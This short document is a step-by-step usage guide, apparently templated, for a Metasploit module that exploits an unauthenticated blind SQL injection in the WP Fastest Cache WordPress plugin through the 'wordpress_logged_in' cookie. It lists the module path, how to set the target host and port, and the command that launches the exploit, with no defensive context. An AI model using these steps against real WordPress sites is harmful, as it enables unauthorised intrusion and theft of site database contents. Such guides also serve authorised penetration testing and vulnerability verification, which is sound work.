**The description of current metasploit exploit**
WP Fastest Cache, a WordPress plugin,          prior to version 1.2.2, is vulnerable to an unauthenticated SQL injection          vulnerability via the 'wordpress_logged_in' cookie. This can be exploited via a blind SQL injection attack without requiring any authentication.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_fastest_cache_sqli
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.